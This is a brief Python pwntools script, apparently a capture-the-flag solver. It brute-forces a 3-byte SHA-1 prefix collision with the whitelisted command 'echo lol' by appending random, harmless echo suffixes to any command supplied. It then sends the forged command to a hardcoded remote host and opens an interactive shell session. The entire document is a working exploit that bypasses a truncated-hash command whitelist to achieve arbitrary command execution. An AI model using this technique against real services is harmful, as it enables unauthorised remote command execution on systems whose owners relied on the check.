import hashlib
import sys
import random
import time
from pwn import *

start_time = time.time()

wl_cmd = b'echo lol'
wl_hash = hashlib.sha1(wl_cmd).digest()[:3]

inputted_cmd = sys.argv[1].encode()

def main():
    cmd = inputted_cmd
    while hashlib.sha1(cmd).digest()[:3] != wl_hash:
        random_string = "".join([chr(random.randint(32,126)) for i in range(8)])
        inconsequential_echo = b' && echo "' + random_string.encode() + b'" > /dev/null'
        cmd = inputted_cmd + inconsequential_echo
    
    end_time = time.time()

    print(f"Success! collision found in {int(end_time - start_time)} seconds")
    print(f"Here's your command: {cmd.decode()}")

    p = remote("157.230.251.184", "1011")
    p.sendline(cmd)
    p.interactive()
    

if __name__ == "__main__":
    main()